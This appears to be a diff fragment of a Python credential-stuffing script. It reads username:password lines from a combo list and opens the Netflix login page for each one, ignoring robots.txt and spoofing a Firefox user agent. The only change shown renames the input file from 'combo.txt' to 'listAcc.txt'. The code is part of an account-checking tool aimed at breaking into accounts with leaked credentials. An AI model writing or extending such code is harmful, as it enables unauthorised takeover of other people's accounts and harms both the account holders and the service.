@@ -30,7 +30,7 @@ br.set_handle_referer(True)
 br.set_handle_robots(False)
 br.addheaders = [('User-agent', 'Firefox')]
 try:
-    with open("combo.txt", "r") as filestream:
+    with open("listAcc.txt", "r") as filestream:
         for line in filestream:
             br.open('https://www.netflix.com/en/login')
             currentline = line.split(':')
